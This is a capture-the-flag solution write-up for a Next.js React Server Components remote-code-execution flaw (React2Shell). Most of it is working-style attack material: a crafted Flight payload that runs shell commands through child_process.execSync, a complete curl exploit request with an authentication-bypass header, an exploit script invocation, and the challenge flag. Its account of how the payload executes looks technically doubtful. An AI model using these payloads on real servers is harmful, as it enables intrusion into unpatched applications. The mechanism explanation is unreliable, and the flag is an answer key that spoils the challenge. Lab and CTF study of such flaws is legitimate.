# 封印解放 — Intended Solution

## CVE-2025-66478 / CVE-2025-55182 (React2Shell)

**CVSS:** 10.0 | **Type:** Pre-Auth RCE | **Target:** Next.js 15.x/16.x with RSC

---

## Quick Solve

```bash
python3 exploit.py http://localhost:3000 'cat /flag.txt'
```

---

## Vulnerability Overview

React Server Components (RSC) use the **Flight protocol** for serialization. The vulnerability is an **unsafe deserialization** flaw that allows RCE via crafted Flight payloads.

### Affected Versions
- Next.js: 15.0.0-15.5.6, 16.0.0-16.0.6
- React: 19.0.0, 19.1.0, 19.1.1, 19.2.0

---

## Exploitation Steps

### Step 1: Identify RSC Endpoint

The `/compiler` page uses Server Actions, which are RSC endpoints:

```bash
curl -I http://localhost:3000/compiler
# Look for: Vary: RSC, Next-Router-State-Tree
```

### Step 2: Craft Flight Payload

The exploit uses a malicious Flight payload:

```
0:{"a":"$@1","f":"","b":"development"}
1:E{"digest":"${require('child_process').execSync('cat /flag.txt').toString()}","message":"NEXT_REDIRECT","stack":[],"environmentName":"Server"}
```

### Step 3: Send Exploit Request

```bash
curl -X POST http://localhost:3000/compiler \
  -H "Content-Type: text/x-component" \
  -H "RSC: 1" \
  -H "Next-Action: 1" \
  -H "x-middleware-subrequest: 1" \
  --data '0:{"a":"$@1","f":"","b":"development"}
1:E{"digest":"${require(\"child_process\").execSync(\"cat /flag.txt\").toString()}","message":"NEXT_REDIRECT","stack":[],"environmentName":"Server"}'
```

### Step 4: Extract Flag

The command output appears in the error response digest field.

---

## Key Headers

| Header | Value | Purpose |
|--------|-------|---------|
| `Content-Type` | `text/x-component` | Identifies RSC request |
| `RSC` | `1` | Enables React Server Component mode |
| `Next-Action` | `1` | Triggers Server Action handler |
| `x-middleware-subrequest` | `1` | Bypasses middleware auth |

---

## Flight Protocol

Each line in the payload is a "chunk":

```
<id>:<type>:<json_data>

Types:
- No prefix: Module/data chunk
- E: Error chunk (used for exploitation)
```

### The Gadget Chain

1. `$@1` creates a reference to chunk ID 1
2. Chunk 1 contains template literal with `require()` call
3. When RSC deserializes, the template executes
4. Command output appears in error digest

---

## Flag

```
L3m0n{Ky0ug0ku_n0_K0t0tsu_B4NK41}
```

Located at `/flag.txt`

---

## References

- [Next.js Advisory](https://github.com/vercel/next.js/security/advisories/GHSA-9qr9-h5gf-34mp)
- [React Advisory](https://github.com/facebook/react/security/advisories/GHSA-fv66-9v8q-g76r)
- [PoC Repository](https://github.com/nehkark/CVE-2025-55182)
- [react2shell.com](https://react2shell.com)
